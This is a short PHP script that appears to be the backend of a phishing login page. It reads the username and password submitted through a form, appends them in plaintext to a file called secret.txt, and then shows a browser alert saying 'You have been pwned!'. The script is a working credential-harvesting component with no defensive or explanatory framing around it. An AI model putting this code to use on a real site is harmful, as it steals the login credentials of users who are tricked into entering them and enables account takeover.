<?php
// Check if the form is submitted via POST method
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Retrieve the data sent through the form
    $username = $_POST['username'] ?? 'Undefined';
    $password = $_POST['password'] ?? 'Undefined';

    // Compose the message
    $message = "Username: $username\nPassword: $password\n";

    // Append the data to the file
    $file = 'secret.txt';
    if (file_put_contents($file, $message, FILE_APPEND | LOCK_EX) !== false) {
        // Display a pop-up using JavaScript
        echo "<script>alert('You have been pwned!');</script>";
    } else {
        // Display a pop-up with an error message
        echo "<script>alert('Error saving data to $file. Please try again later.');</script>";
    }
} else {
    // If the form is not submitted via POST method, display a pop-up with an error message
    echo "<script>alert('Form must be submitted via POST method.');</script>";
}
?>
